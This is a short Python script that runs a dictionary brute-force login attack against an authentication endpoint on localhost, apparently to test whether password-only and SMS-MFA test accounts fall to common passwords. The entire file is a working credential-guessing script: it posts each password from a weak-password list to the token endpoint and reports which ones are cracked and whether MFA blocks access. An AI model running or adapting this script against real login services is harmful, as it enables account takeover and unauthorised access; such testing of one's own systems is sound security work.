import requests

BASE_URL = "http://127.0.0.1:8001/auth"

def brute_force_attack(target_username, password_list):
    print(f"Starting Brute Force against {target_username}...")
    for password in password_list:
        try:
            resp = requests.post(f"{BASE_URL}/token", data={"username": target_username, "password": password})
            
            if resp.status_code == 200:
                data = resp.json()
                if "access_token" in data:
                    print(f"[SUCCESS] Password Cracked: {password} (Access Granted)")
                    return True
                elif data.get("mfa_required"):
                    print(f"[PARTIAL] Password Cracked: {password} (Blocked by MFA: {data['mfa_type']})")
                    return True
        except Exception:
            pass
    
    print("[FAIL] Password not found in dictionary")
    return False

if __name__ == "__main__":
    passwords = ["123456", "password", "12345678", "qwerty", "1234567890", "admin", "welcome"]
    
    # Test against Password Only User
    brute_force_attack("user_pwd_0", passwords)
    
    # Test against SMS User
    brute_force_attack("user_sms_0", passwords)
